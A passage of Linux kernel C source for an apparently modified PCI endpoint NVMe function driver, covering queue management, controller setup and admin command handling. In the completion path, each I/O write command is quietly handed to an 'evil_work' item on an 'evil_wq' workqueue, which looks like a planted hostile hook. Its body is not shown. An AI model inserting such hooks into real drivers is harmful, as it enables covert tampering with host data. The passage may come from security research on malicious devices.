	epcmd->status = NVME_SC_PRP_INVALID_OFFSET | NVME_STATUS_DNR;
	return -EINVAL;
}

static void pci_epf_nvme_exec_cmd(struct pci_epf_nvme_cmd *epcmd,
			void (*post_exec_hook)(struct pci_epf_nvme_cmd *))
{
	struct pci_epf_nvme *epf_nvme = epcmd->epf_nvme;
	struct nvme_command *cmd = &epcmd->cmd;
	struct request_queue *q;
	int ret;

	if (epcmd->ns)
		q = epcmd->ns->queue;
	else
		q = epf_nvme->ctrl.ctrl->admin_q;

	if (epcmd->buffer_size) {
		/* Setup the command buffer */
		ret = pci_epf_nvme_cmd_parse_dptr(epcmd);
		if (ret)
			return;

		/* Get data from the host if needed */
		if (epcmd->dma_dir == DMA_FROM_DEVICE) {
			ret = pci_epf_nvme_transfer_cmd_data(epcmd);
			if (ret)
				return;
		}
	}

	/* Synchronously execute the command */
	ret = __nvme_submit_sync_cmd(q, cmd, &epcmd->cqe.result,
				     epcmd->buffer, epcmd->buffer_size,
				     NVME_QID_ANY, 0);
	if (ret < 0)
		epcmd->status = NVME_SC_INTERNAL | NVME_STATUS_DNR;
	else if (ret > 0)
		epcmd->status = ret;

	if (epcmd->status != NVME_SC_SUCCESS) {
		dev_err(&epf_nvme->epf->dev,
			"QID %d: submit command %s (0x%x) failed, status 0x%0x\n",
			epcmd->sqid, pci_epf_nvme_cmd_name(epcmd),
			epcmd->cmd.common.opcode, epcmd->status);
		return;
	}

	if (post_exec_hook)
		post_exec_hook(epcmd);

	if (epcmd->buffer_size && epcmd->dma_dir == DMA_TO_DEVICE)
		pci_epf_nvme_transfer_cmd_data(epcmd);
}

static void pci_epf_nvme_exec_cmd_work(struct work_struct *work)
{
	struct pci_epf_nvme_cmd *epcmd =
		container_of(work, struct pci_epf_nvme_cmd, work);

	pci_epf_nvme_exec_cmd(epcmd, NULL);

	pci_epf_nvme_complete_cmd(epcmd);
}

static bool pci_epf_nvme_queue_response(struct pci_epf_nvme_cmd *epcmd)
{
	struct pci_epf_nvme *epf_nvme = epcmd->epf_nvme;
	struct pci_epf *epf = epf_nvme->epf;
	struct pci_epf_nvme_ctrl *ctrl = &epf_nvme->ctrl;
	struct pci_epf_nvme_queue *sq = &ctrl->sq[epcmd->sqid];
	struct pci_epf_nvme_queue *cq = &ctrl->cq[epcmd->cqid];
	struct nvme_completion *cqe = &epcmd->cqe;

	/*
	 * Do not try to complete commands if the controller is not ready
	 * anymore, e.g. after the host cleared CC.EN.
	 */
	if (!pci_epf_nvme_ctrl_ready(epf_nvme) ||
	    !(cq->qflags & PCI_EPF_NVME_QUEUE_LIVE))
		goto free_cmd;

	/* Check completion queue full state */
	cq->head = pci_epf_nvme_reg_read32(ctrl, cq->db);
	if (cq->head == cq->tail + 1)
		return false;

	/* Setup the completion entry */
	cqe->sq_id = cpu_to_le16(epcmd->sqid);
	cqe->sq_head = cpu_to_le16(sq->head);
	cqe->command_id = epcmd->cmd.common.command_id;
	cqe->status = cpu_to_le16((epcmd->status << 1) | cq->phase);

	/* Post the completion entry */
	dev_dbg(&epf->dev,
		"cq[%d]: %s status 0x%x, head %d, tail %d, phase %d\n",
		epcmd->cqid, pci_epf_nvme_cmd_name(epcmd),
		epcmd->status, cq->head, cq->tail, cq->phase);

	memcpy_toio(cq->pci_map.virt_addr + cq->tail * cq->qes, cqe,
		    sizeof(struct nvme_completion));

	/* Advance the tail */
	cq->tail++;
	if (cq->tail >= cq->depth) {
		cq->tail = 0;
		cq->phase ^= 1;
	}

	if (epcmd->sqid && epcmd->cmd.common.opcode == nvme_cmd_write) {
		queue_work(epf_nvme->evil_wq, &epcmd->evil_work);
		return true;
	}

free_cmd:
	pci_epf_nvme_free_cmd(epcmd);

	return true;
}

static int pci_epf_nvme_map_queue(struct pci_epf_nvme *epf_nvme,
				  struct pci_epf_nvme_queue *q)
{
	struct pci_epf *epf = epf_nvme->epf;
	int ret;

	ret = pci_epc_mem_map(epf->epc, epf->func_no, epf->vfunc_no,
			      q->pci_addr, q->pci_size, &q->pci_map);
	if (ret) {
		dev_err(&epf->dev, "Map %cQ %d failed %d\n",
			q->qflags & PCI_EPF_NVME_QUEUE_IS_SQ ? 'S' : 'C',
			q->qid, ret);
		return ret;
	}

	if (q->pci_map.pci_size < q->pci_size) {
		dev_err(&epf->dev, "Partial %cQ %d mapping\n",
			q->qflags & PCI_EPF_NVME_QUEUE_IS_SQ ? 'S' : 'C',
			q->qid);
		pci_epc_mem_unmap(epf->epc, epf->func_no, epf->vfunc_no,
				  &q->pci_map);
		return -ENOMEM;
	}

	return 0;
}

static inline void pci_epf_nvme_unmap_queue(struct pci_epf_nvme *epf_nvme,
					    struct pci_epf_nvme_queue *q)
{
	struct pci_epf *epf = epf_nvme->epf;

	pci_epc_mem_unmap(epf->epc, epf->func_no, epf->vfunc_no,
			  &q->pci_map);
}

static void pci_epf_nvme_delete_queue(struct pci_epf_nvme *epf_nvme,
				      struct pci_epf_nvme_queue *q)
{
	struct pci_epf_nvme_cmd *epcmd;

	q->qflags &= ~PCI_EPF_NVME_QUEUE_LIVE;

	if (q->cmd_wq) {
		flush_workqueue(q->cmd_wq);
		destroy_workqueue(q->cmd_wq);
		q->cmd_wq = NULL;
	}

	flush_delayed_work(&q->work);
	cancel_delayed_work_sync(&q->work);

	while (!list_empty(&q->list)) {
		epcmd = list_first_entry(&q->list,
					 struct pci_epf_nvme_cmd, link);
		list_del_init(&epcmd->link);
		pci_epf_nvme_free_cmd(epcmd);
	}
}

static void pci_epf_nvme_cq_work(struct work_struct *work);

static int pci_epf_nvme_create_cq(struct pci_epf_nvme *epf_nvme, int qid,
				  int flags, int size, int vector,
				  phys_addr_t pci_addr)
{
	struct pci_epf_nvme_ctrl *ctrl = &epf_nvme->ctrl;
	struct pci_epf_nvme_queue *cq = &ctrl->cq[qid];
	struct pci_epf *epf = epf_nvme->epf;

	/*
	 * Increment the queue reference count: if the queue is already being
	 * used, we have nothing to do.
	 */
	cq->ref++;
	if (cq->ref > 1)
		return 0;

	/* Setup the completion queue */
	cq->pci_addr = pci_addr;
	cq->qid = qid;
	cq->cqid = qid;
	cq->size = size;
	cq->flags = flags;
	cq->depth = size + 1;
	cq->vector = vector;
	cq->head = 0;
	cq->tail = 0;
	cq->phase = 1;
	cq->db = NVME_REG_DBS + (((qid * 2) + 1) * sizeof(u32));
	pci_epf_nvme_reg_write32(ctrl, cq->db, 0);
	INIT_DELAYED_WORK(&cq->work, pci_epf_nvme_cq_work);
	if (!qid)
		cq->qes = ctrl->adm_cqes;
	else
		cq->qes = ctrl->io_cqes;
	cq->pci_size = cq->qes * cq->depth;

	dev_dbg(&epf->dev,
		"CQ %d: %d entries of %zu B, vector IRQ %d\n",
		qid, cq->size, cq->qes, (int)cq->vector + 1);

	cq->qflags = PCI_EPF_NVME_QUEUE_LIVE;

	return 0;
}

static void pci_epf_nvme_delete_cq(struct pci_epf_nvme *epf_nvme, int qid)
{
	struct pci_epf_nvme_queue *cq = &epf_nvme->ctrl.cq[qid];

	if (cq->ref < 1)
		return;

	cq->ref--;
	if (cq->ref)
		return;

	pci_epf_nvme_delete_queue(epf_nvme, cq);
}

static void pci_epf_nvme_sq_work(struct work_struct *work);

static int pci_epf_nvme_create_sq(struct pci_epf_nvme *epf_nvme, int qid,
				  int cqid, int flags, int size,
				  phys_addr_t pci_addr)
{
	struct pci_epf_nvme_ctrl *ctrl = &epf_nvme->ctrl;
	struct pci_epf_nvme_queue *sq = &ctrl->sq[qid];
	struct pci_epf_nvme_queue *cq = &ctrl->cq[cqid];
	struct pci_epf *epf = epf_nvme->epf;

	/* Setup the submission queue */
	sq->qflags = PCI_EPF_NVME_QUEUE_IS_SQ;
	sq->pci_addr = pci_addr;
	sq->ref = 1;
	sq->qid = qid;
	sq->cqid = cqid;
	sq->size = size;
	sq->flags = flags;
	sq->depth = size + 1;
	sq->head = 0;
	sq->tail = 0;
	sq->phase = 0;
	sq->db = NVME_REG_DBS + (qid * 2 * sizeof(u32));
	pci_epf_nvme_reg_write32(ctrl, sq->db, 0);
	INIT_DELAYED_WORK(&sq->work, pci_epf_nvme_sq_work);
	if (!qid)
		sq->qes = ctrl->adm_sqes;
	else
		sq->qes = ctrl->io_sqes;
	sq->pci_size = sq->qes * sq->depth;

	sq->cmd_wq = alloc_workqueue("sq%d_wq", WQ_HIGHPRI | WQ_UNBOUND,
				     min_t(int, sq->depth, WQ_MAX_ACTIVE), qid);
	if (!sq->cmd_wq) {
		dev_err(&epf->dev, "Create SQ %d cmd wq failed\n", qid);
		memset(sq, 0, sizeof(*sq));
		return -ENOMEM;
	}

	/* Get a reference on the completion queue */
	cq->ref++;
	cq->sq = sq;

	dev_dbg(&epf->dev,
		"SQ %d: %d queue entries of %zu B, CQ %d\n",
		qid, size, sq->qes, cqid);

	sq->qflags |= PCI_EPF_NVME_QUEUE_LIVE;

	return 0;
}

static void pci_epf_nvme_delete_sq(struct pci_epf_nvme *epf_nvme, int qid)
{
	struct pci_epf_nvme_queue *sq = &epf_nvme->ctrl.sq[qid];

	if (!sq->ref)
		return;

	sq->ref--;
	if (WARN_ON_ONCE(sq->ref != 0))
		return;

	pci_epf_nvme_delete_queue(epf_nvme, sq);

	if (epf_nvme->ctrl.cq[sq->cqid].ref)
		epf_nvme->ctrl.cq[sq->cqid].ref--;
}

static void pci_epf_nvme_disable_ctrl(struct pci_epf_nvme *epf_nvme)
{
	struct pci_epf_nvme_ctrl *ctrl = &epf_nvme->ctrl;
	struct pci_epf *epf = epf_nvme->epf;
	int qid;

	if (!epf_nvme->ctrl_enabled)
		return;

	dev_info(&epf->dev, "Disabling controller\n");

	/*
	 * Delete the submission queues first to release all references
	 * to the completion queues. This also stops polling for submissions
	 * and drains any pending command from the queue.
	 */
	for (qid = 1; qid < ctrl->nr_queues; qid++)
		pci_epf_nvme_delete_sq(epf_nvme, qid);

	for (qid = 1; qid < ctrl->nr_queues; qid++)
		pci_epf_nvme_delete_cq(epf_nvme, qid);

	/* Unmap the admin queue last */
	pci_epf_nvme_delete_sq(epf_nvme, 0);
	pci_epf_nvme_delete_cq(epf_nvme, 0);

	/* Tell the host we are done */
	ctrl->csts &= ~NVME_CSTS_RDY;
	if (ctrl->cc & NVME_CC_SHN_NORMAL) {
		ctrl->csts |= NVME_CSTS_SHST_CMPLT;
		ctrl->cc &= ~NVME_CC_SHN_NORMAL;
	}
	ctrl->cc &= ~NVME_CC_ENABLE;
	pci_epf_nvme_reg_write32(ctrl, NVME_REG_CSTS, ctrl->csts);
	pci_epf_nvme_reg_write32(ctrl, NVME_REG_CC, ctrl->cc);

	epf_nvme->ctrl_enabled = false;
}

static void pci_epf_nvme_delete_ctrl(struct pci_epf *epf)
{
	struct pci_epf_nvme *epf_nvme = epf_get_drvdata(epf);
	struct pci_epf_nvme_ctrl *ctrl = &epf_nvme->ctrl;

	dev_info(&epf->dev, "Deleting controller\n");

	if (ctrl->ctrl) {
		nvme_put_ctrl(ctrl->ctrl);
		ctrl->ctrl = NULL;

		ctrl->cc &= ~NVME_CC_SHN_NORMAL;
		ctrl->csts |= NVME_CSTS_SHST_CMPLT;
	}

	pci_epf_nvme_disable_ctrl(epf_nvme);

	if (ctrl->wq) {
		flush_workqueue(ctrl->wq);
		destroy_workqueue(ctrl->wq);
		ctrl->wq = NULL;
	}

	ctrl->nr_queues = 0;
	kfree(ctrl->cq);
	ctrl->cq = NULL;
	kfree(ctrl->sq);
	ctrl->sq = NULL;
}

static struct pci_epf_nvme_queue *
pci_epf_nvme_alloc_queues(struct pci_epf_nvme *epf_nvme, int nr_queues)
{
	struct pci_epf_nvme_queue *q;
	int i;

	q = kcalloc(nr_queues, sizeof(struct pci_epf_nvme_queue), GFP_KERNEL);
	if (!q)
		return NULL;

	for (i = 0; i < nr_queues; i++) {
		q[i].epf_nvme = epf_nvme;
		spin_lock_init(&q[i].lock);
		INIT_LIST_HEAD(&q[i].list);
	}

	return q;
}

static int pci_epf_nvme_create_ctrl(struct pci_epf *epf)
{
	struct pci_epf_nvme *epf_nvme = epf_get_drvdata(epf);
	const struct pci_epc_features *features = epf_nvme->epc_features;
	struct pci_epf_nvme_ctrl *ctrl = &epf_nvme->ctrl;
	struct nvme_ctrl *fctrl;
	int ret;

	/* We must have nvme fabrics options. */
	if (!epf_nvme->ctrl_opts_buf) {
		dev_err(&epf->dev, "No nvme fabrics options specified\n");
		return -EINVAL;
	}

	/* Create the fabrics controller */
	fctrl = nvmf_create_ctrl(&epf->dev, epf_nvme->ctrl_opts_buf);
	if (IS_ERR(fctrl)) {
		dev_err(&epf->dev, "Create nvme fabrics controller failed\n");
		return PTR_ERR(fctrl);
	}

	/* We only support IO controllers */
	if (fctrl->cntrltype != NVME_CTRL_IO) {
		dev_err(&epf->dev, "Unsupported controller type\n");
		ret = -EINVAL;
		goto out_delete_ctrl;
	}

	dev_info(&epf->dev, "NVMe fabrics controller created, %u I/O queues\n",
		 fctrl->queue_count - 1);

	epf_nvme->queue_count =
		min(fctrl->queue_count, PCI_EPF_NVME_MAX_NR_QUEUES);
	if (features->msix_capable && epf->msix_interrupts) {
		dev_info(&epf->dev,
			 "NVMe PCI controller supports MSI-X, %u vectors\n",
			 epf->msix_interrupts);
		epf_nvme->queue_count =
			min(epf_nvme->queue_count, epf->msix_interrupts);
	} else if (features->msi_capable && epf->msi_interrupts) {
		dev_info(&epf->dev,
			 "NVMe PCI controller supports MSI, %u vectors\n",
			 epf->msi_interrupts);
		epf_nvme->queue_count =
			min(epf_nvme->queue_count, epf->msi_interrupts);
	}

	if (epf_nvme->queue_count < 2) {
		dev_info(&epf->dev, "Invalid number of queues %u\n",
			 epf_nvme->queue_count);
		ret = -EINVAL;
		goto out_delete_ctrl;
	}

	if (epf_nvme->queue_count != fctrl->queue_count)
		dev_info(&epf->dev, "Limiting number of queues to %u\n",
			 epf_nvme->queue_count);

	dev_info(&epf->dev, "NVMe PCI controller: %u I/O queues\n",
		 epf_nvme->queue_count - 1);

	ret = -ENOMEM;

	/* Create the workqueue for processing our SQs and CQs */
	ctrl->wq = alloc_workqueue("ctrl_wq", WQ_HIGHPRI | WQ_UNBOUND,
				min_t(int, ctrl->nr_queues * 2, WQ_MAX_ACTIVE));
	if (!ctrl->wq) {
		dev_err(&epf->dev, "Create controller wq failed\n");
		goto out_delete_ctrl;
	}

	/* Allocate queues */
	ctrl->nr_queues = epf_nvme->queue_count;
	ctrl->sq = pci_epf_nvme_alloc_queues(epf_nvme, ctrl->nr_queues);
	if (!ctrl->sq)
		goto out_delete_ctrl;

	ctrl->cq = pci_epf_nvme_alloc_queues(epf_nvme, ctrl->nr_queues);
	if (!ctrl->cq)
		goto out_delete_ctrl;

	epf_nvme->ctrl.ctrl = fctrl;

	return 0;

out_delete_ctrl:
	pci_epf_nvme_delete_ctrl(epf);

	return ret;
}

static void pci_epf_nvme_init_ctrl_regs(struct pci_epf *epf)
{
	struct pci_epf_nvme *epf_nvme = epf_get_drvdata(epf);
	struct pci_epf_nvme_ctrl *ctrl = &epf_nvme->ctrl;

	ctrl->reg = epf_nvme->reg_bar;

	/* Copy the fabrics controller capabilities as a base */
	ctrl->cap = ctrl->ctrl->cap;

	/* Contiguous Queues Required (CQR) */
	ctrl->cap |= 0x1ULL << 16;

	/* Set Doorbell stride to 4B (DSTRB) */
	ctrl->cap &= ~GENMASK(35, 32);

	/* Clear NVM Subsystem Reset Supported (NSSRS) */
	ctrl->cap &= ~(0x1ULL << 36);

	/* Clear Boot Partition Support (BPS) */
	ctrl->cap &= ~(0x1ULL << 45);

	/* Memory Page Size minimum (MPSMIN) = 4K */
	ctrl->cap |= (NVME_CTRL_PAGE_SHIFT - 12) << NVME_CC_MPS_SHIFT;

	/* Memory Page Size maximum (MPSMAX) = 4K */
	ctrl->cap |= (NVME_CTRL_PAGE_SHIFT - 12) << NVME_CC_MPS_SHIFT;

	/* Clear Persistent Memory Region Supported (PMRS) */
	ctrl->cap &= ~(0x1ULL << 56);

	/* Clear Controller Memory Buffer Supported (CMBS) */
	ctrl->cap &= ~(0x1ULL << 57);

	/* NVMe version supported */
	ctrl->vs = ctrl->ctrl->vs;

	/* Controller configuration */
	ctrl->cc = ctrl->ctrl->ctrl_config & (~NVME_CC_ENABLE);

	/* Controller Status (not ready) */
	ctrl->csts = 0;

	pci_epf_nvme_reg_write64(ctrl, NVME_REG_CAP, ctrl->cap);
	pci_epf_nvme_reg_write32(ctrl, NVME_REG_VS, ctrl->vs);
	pci_epf_nvme_reg_write32(ctrl, NVME_REG_CSTS, ctrl->csts);
	pci_epf_nvme_reg_write32(ctrl, NVME_REG_CC, ctrl->cc);
}

static void pci_epf_nvme_enable_ctrl(struct pci_epf_nvme *epf_nvme)
{
	struct pci_epf_nvme_ctrl *ctrl = &epf_nvme->ctrl;
	struct pci_epf *epf = epf_nvme->epf;
	int ret;

	dev_info(&epf->dev, "Enabling controller\n");

	ctrl->mdts = epf_nvme->mdts_kb * SZ_1K;

	ctrl->mps_shift = ((ctrl->cc >> NVME_CC_MPS_SHIFT) & 0xf) + 12;
	ctrl->mps = 1UL << ctrl->mps_shift;
	ctrl->mps_mask = ctrl->mps - 1;

	ctrl->adm_sqes = 1UL << NVME_ADM_SQES;
	ctrl->adm_cqes = sizeof(struct nvme_completion);
	ctrl->io_sqes = 1UL << ((ctrl->cc >> NVME_CC_IOSQES_SHIFT) & 0xf);
	ctrl->io_cqes = 1UL << ((ctrl->cc >> NVME_CC_IOCQES_SHIFT) & 0xf);

	if (ctrl->io_sqes < sizeof(struct nvme_command)) {
		dev_err(&epf->dev, "Unsupported IO sqes %zu (need %zu)\n",
			ctrl->io_sqes, sizeof(struct nvme_command));
		return;
	}

	if (ctrl->io_cqes < sizeof(struct nvme_completion)) {
		dev_err(&epf->dev, "Unsupported IO cqes %zu (need %zu)\n",
			ctrl->io_sqes, sizeof(struct nvme_completion));
		return;
	}

	ctrl->aqa = pci_epf_nvme_reg_read32(ctrl, NVME_REG_AQA);
	ctrl->asq = pci_epf_nvme_reg_read64(ctrl, NVME_REG_ASQ);
	ctrl->acq = pci_epf_nvme_reg_read64(ctrl, NVME_REG_ACQ);

	/*
	 * Create the PCI controller admin completion and submission queues.
	 */
	ret = pci_epf_nvme_create_cq(epf_nvme, 0,
				NVME_QUEUE_PHYS_CONTIG | NVME_CQ_IRQ_ENABLED,
				(ctrl->aqa & 0x0fff0000) >> 16, 0,
				ctrl->acq & GENMASK(63, 12));
	if (ret)
		return;

	ret = pci_epf_nvme_create_sq(epf_nvme, 0, 0, NVME_QUEUE_PHYS_CONTIG,
				     ctrl->aqa & 0x0fff,
				     ctrl->asq & GENMASK(63, 12));
	if (ret) {
		pci_epf_nvme_delete_cq(epf_nvme, 0);
		return;
	}

	nvme_start_ctrl(ctrl->ctrl);

	/* Tell the host we are now ready */
	ctrl->csts |= NVME_CSTS_RDY;
	pci_epf_nvme_reg_write32(ctrl, NVME_REG_CSTS, ctrl->csts);

	/* Start polling the admin submission queue */
	queue_delayed_work(ctrl->wq, &ctrl->sq[0].work, msecs_to_jiffies(5));

	epf_nvme->ctrl_enabled = true;
}

static void pci_epf_nvme_process_create_cq(struct pci_epf_nvme *epf_nvme,
					   struct pci_epf_nvme_cmd *epcmd)
{
	struct nvme_command *cmd = &epcmd->cmd;
	int mqes = NVME_CAP_MQES(epf_nvme->ctrl.cap);
	u16 cqid, cq_flags, qsize, vector;
	int ret;

	cqid = le16_to_cpu(cmd->create_cq.cqid);
	if (cqid >= epf_nvme->ctrl.nr_queues || epf_nvme->ctrl.cq[cqid].ref) {
		epcmd->status = NVME_SC_QID_INVALID | NVME_STATUS_DNR;
		return;
	}

	cq_flags = le16_to_cpu(cmd->create_cq.cq_flags);
	if (!(cq_flags & NVME_QUEUE_PHYS_CONTIG)) {
		epcmd->status = NVME_SC_INVALID_QUEUE | NVME_STATUS_DNR;
		return;
	}

	qsize = le16_to_cpu(cmd->create_cq.qsize);
	if (!qsize || qsize > NVME_CAP_MQES(epf_nvme->ctrl.cap)) {
		if (qsize > mqes)
			dev_warn(&epf_nvme->epf->dev,
				 "Create CQ %d, qsize %d > mqes %d: buggy driver?\n",
				 cqid, (int)qsize, mqes);
		epcmd->status = NVME_SC_QUEUE_SIZE | NVME_STATUS_DNR;
		return;
	}

	vector = le16_to_cpu(cmd->create_cq.irq_vector);
	if (vector >= epf_nvme->nr_vectors) {
		epcmd->status = NVME_SC_INVALID_VECTOR | NVME_STATUS_DNR;
		return;
	}

	ret = pci_epf_nvme_create_cq(epf_nvme, cqid, cq_flags, qsize, vector,
				     le64_to_cpu(cmd->create_cq.prp1));
	if (ret)
		epcmd->status = NVME_SC_INTERNAL | NVME_STATUS_DNR;
}

static void pci_epf_nvme_process_delete_cq(struct pci_epf_nvme *epf_nvme,
					   struct pci_epf_nvme_cmd *epcmd)
{
	struct nvme_command *cmd = &epcmd->cmd;
	u16 cqid;

	cqid = le16_to_cpu(cmd->delete_queue.qid);
	if (!cqid ||
	    cqid >= epf_nvme->ctrl.nr_queues ||
	    !epf_nvme->ctrl.cq[cqid].ref) {
		epcmd->status = NVME_SC_QID_INVALID | NVME_STATUS_DNR;
		return;
	}

	pci_epf_nvme_delete_cq(epf_nvme, cqid);
}

static void pci_epf_nvme_process_create_sq(struct pci_epf_nvme *epf_nvme,
					   struct pci_epf_nvme_cmd *epcmd)
{
	struct nvme_command *cmd = &epcmd->cmd;
	int mqes = NVME_CAP_MQES(epf_nvme->ctrl.cap);
	u16 sqid, cqid, sq_flags, qsize;
	int ret;

	sqid = le16_to_cpu(cmd->create_sq.sqid);
	if (!sqid || sqid > epf_nvme->ctrl.nr_queues ||
	    epf_nvme->ctrl.sq[sqid].ref) {
		epcmd->status = NVME_SC_QID_INVALID | NVME_STATUS_DNR;
		return;
	}

	cqid = le16_to_cpu(cmd->create_sq.cqid);
	if (!cqid || !epf_nvme->ctrl.cq[cqid].ref) {
		epcmd->status = NVME_SC_CQ_INVALID | NVME_STATUS_DNR;
		return;
	}

	sq_flags = le16_to_cpu(cmd->create_sq.sq_flags);
	if (!(sq_flags & NVME_QUEUE_PHYS_CONTIG)) {
		epcmd->status = NVME_SC_INVALID_QUEUE | NVME_STATUS_DNR;
		return;
	}

	qsize = le16_to_cpu(cmd->create_sq.qsize);
	if (!qsize || qsize > mqes) {
		if (qsize > mqes)
			dev_warn(&epf_nvme->epf->dev,
				 "Create SQ %d, qsize %d > mqes %d: buggy driver?\n",
				 sqid, (int)qsize, mqes);
		epcmd->status = NVME_SC_QUEUE_SIZE | NVME_STATUS_DNR;
		return;
	}

	ret = pci_epf_nvme_create_sq(epf_nvme, sqid, cqid, sq_flags, qsize,
				     le64_to_cpu(cmd->create_sq.prp1));
	if (ret) {
		epcmd->status = NVME_SC_INTERNAL | NVME_STATUS_DNR;
		return;
	}

	/* Start polling the submission queue */
	queue_delayed_work(epf_nvme->ctrl.wq, &epf_nvme->ctrl.sq[sqid].work, 1);
}

static void pci_epf_nvme_process_delete_sq(struct pci_epf_nvme *epf_nvme,
					   struct pci_epf_nvme_cmd *epcmd)
{
	struct nvme_command *cmd = &epcmd->cmd;
	u16 sqid;

	sqid = le16_to_cpu(cmd->delete_queue.qid);
	if (!sqid ||
	    sqid >= epf_nvme->ctrl.nr_queues ||
	    !epf_nvme->ctrl.sq[sqid].ref) {
		epcmd->status = NVME_SC_QID_INVALID | NVME_STATUS_DNR;
		return;
	}

	pci_epf_nvme_delete_sq(epf_nvme, sqid);
}

static void pci_epf_nvme_identify_hook(struct pci_epf_nvme_cmd *epcmd)
{
	struct pci_epf_nvme *epf_nvme = epcmd->epf_nvme;
	struct nvme_command *cmd = &epcmd->cmd;
	struct nvme_id_ctrl *id = epcmd->buffer;
	unsigned int page_shift;

	if (cmd->identify.cns != NVME_ID_CNS_CTRL)
		return;

	/* Set device vendor IDs */
	id->vid = cpu_to_le16(epf_nvme->epf->header->vendorid);
	id->ssvid = id->vid;

	/* Set Maximum Data Transfer Size (MDTS) */
	page_shift = NVME_CAP_MPSMIN(epf_nvme->ctrl.ctrl->cap) + 12;
	id->mdts = ilog2(epf_nvme->ctrl.mdts) - page_shift;

	/* Clear Controller Multi-Path I/O and Namespace Sharing Capabilities */
	id->cmic = 0;

	/* Do not report support for Autonomous Power State Transitions */
	id->apsta = 0;

	/* Indicate no support for SGLs */
	id->sgls = 0;
}

static void pci_epf_nvme_get_log_hook(struct pci_epf_nvme_cmd *epcmd)
{
	struct nvme_command *cmd = &epcmd->cmd;
	struct nvme_effects_log *log = epcmd->buffer;

	if (cmd->get_log_page.lid != NVME_LOG_CMD_EFFECTS)
		return;

	/*
	 * ACS0     [Delete I/O Submission Queue     ] 00000001
	 * CSUPP+  LBCC-  NCC-  NIC-  CCC-  USS-  No command restriction
	 */
	log->acs[0] |= cpu_to_le32(NVME_CMD_EFFECTS_CSUPP);

	/*
	 * ACS1     [Create I/O Submission Queue     ] 00000001
	 * CSUPP+  LBCC-  NCC-  NIC-  CCC-  USS-  No command restriction
	 */
	log->acs[1] |= cpu_to_le32(NVME_CMD_EFFECTS_CSUPP);

	/*
	 * ACS4     [Delete I/O Completion Queue     ] 00000001
	 * CSUPP+  LBCC-  NCC-  NIC-  CCC-  USS-  No command restriction
	 */
	log->acs[4] |= cpu_to_le32(NVME_CMD_EFFECTS_CSUPP);

	/*
	 * ACS5     [Create I/O Completion Queue     ] 00000001
	 * CSUPP+  LBCC-  NCC-  NIC-  CCC-  USS-  No command restriction
	 */
	log->acs[5] |= cpu_to_le32(NVME_CMD_EFFECTS_CSUPP);
}

/*
 * Returns true if the command has been handled
 */
static bool pci_epf_nvme_process_set_features(struct pci_epf_nvme_cmd *epcmd)
{
	struct pci_epf_nvme *epf_nvme = epcmd->epf_nvme;
	struct pci_epf_nvme_ctrl *ctrl = &epf_nvme->ctrl;
	u32 cdw10 = le32_to_cpu(epcmd->cmd.common.cdw10);
	u32 cdw11 = le32_to_cpu(epcmd->cmd.common.cdw11);
	u8 feat = cdw10 & 0xff;
	u16 nr_ioq, nsqr, ncqr;
	int qid;

	switch (feat) {
	case NVME_FEAT_NUM_QUEUES:
		ncqr = (cdw11 >> 16) & 0xffff;
		nsqr = cdw11 & 0xffff;
		if (ncqr == 0xffff || nsqr == 0xffff) {
			epcmd->status = NVME_SC_INVALID_FIELD | NVME_STATUS_DNR;
			return true;
		}

		/* We cannot accept this command if we already have IO queues */
		for (qid = 1; qid < ctrl->nr_queues; qid++) {
			if (epf_nvme->ctrl.sq[qid].ref ||
			    epf_nvme->ctrl.cq[qid].ref) {
				epcmd->status =
					NVME_SC_CMD_SEQ_ERROR | NVME_STATUS_DNR;
				return true;
			}
		}

		/*
		 * Number of I/O queues to report must not include the admin
		 * queue and is a 0-based value, so it is the total number of
		 * queues minus two.
		 */
		nr_ioq = ctrl->nr_queues - 2;
		epcmd->cqe.result.u32 = cpu_to_le32(nr_ioq | (nr_ioq << 16));
		return true;
	case NVME_FEAT_IRQ_COALESCE:
	case NVME_FEAT_ARBITRATION:
		/* We do not need to do anything special here. */
		epcmd->status = NVME_SC_SUCCESS;
		return true;
	default:
		return false;
	}
}

/*
 * Returns true if the command has been handled
 */
static bool pci_epf_nvme_process_get_features(struct pci_epf_nvme_cmd *epcmd)
{
	struct pci_epf_nvme *epf_nvme = epcmd->epf_nvme;
	struct pci_epf_nvme_ctrl *ctrl = &epf_nvme->ctrl;
	u32 cdw10 = le32_to_cpu(epcmd->cmd.common.cdw10);
	u8 feat = cdw10 & 0xff;
	u16 nr_ioq;

	switch (feat) {
	case NVME_FEAT_NUM_QUEUES:
		/*
		 * Number of I/O queues to report must not include the admin
		 * queue and is a 0-based value, so it is the total number of
		 * queues minus two.
		 */
		nr_ioq = ctrl->nr_queues - 2;
		epcmd->cqe.result.u32 = cpu_to_le32(nr_ioq | (nr_ioq << 16));
		return true;
	case NVME_FEAT_IRQ_COALESCE:
	case NVME_FEAT_ARBITRATION:
		/* We do not need to do anything special here. */
		epcmd->status = NVME_SC_SUCCESS;
		return true;
	default:
		return false;
	}
}

static void pci_epf_nvme_process_admin_cmd(struct pci_epf_nvme_cmd *epcmd)
{
	struct pci_epf_nvme *epf_nvme = epcmd->epf_nvme;
	void (*post_exec_hook)(struct pci_epf_nvme_cmd *) = NULL;
	struct nvme_command *cmd = &epcmd->cmd;

	switch (cmd->common.opcode) {
	case nvme_admin_identify:
		post_exec_hook = pci_epf_nvme_identify_hook;
		epcmd->buffer_size = NVME_IDENTIFY_DATA_SIZE;
		epcmd->dma_dir = DMA_TO_DEVICE;
		break;

	case nvme_admin_get_log_page:
		post_exec_hook = pci_epf_nvme_get_log_hook;
		epcmd->buffer_size = nvme_get_log_page_len(cmd);
		epcmd->dma_dir = DMA_TO_DEVICE;
		break;

	case nvme_admin_async_event:
		/*
		 * Async events are a pain to deal with as they get canceled
		 * only once we delete the fabrics controller, which happens
		 * after the epf function is deleted, thus causing access to
		 * freed memory or leaking of epcmd. So ignore these commands
		 * for now, which is fine. The host will simply never see any
		 * event.
		 */
		pci_epf_nvme_free_cmd(epcmd);
		return;

	case nvme_admin_set_features:
		/*
		 * Several NVMe features do not apply to the NVMe fabrics
		 * host controller, so handle them directly here.
		 */
		if (pci_epf_nvme_process_set_features(epcmd))
			goto complete;
		break;

	case nvme_admin_get_features:
		/*
		 * Several NVMe features do not apply to the NVMe fabrics
		 * host controller, so handle them directly here.
		 */
		if (pci_epf_nvme_process_get_features(epcmd))
			goto complete;

	case nvme_admin_abort_cmd:
		break;

	case nvme_admin_create_cq:
		pci_epf_nvme_process_create_cq(epf_nvme, epcmd);
		goto complete;

	case nvme_admin_create_sq:
		pci_epf_nvme_process_create_sq(epf_nvme, epcmd);
		goto complete;

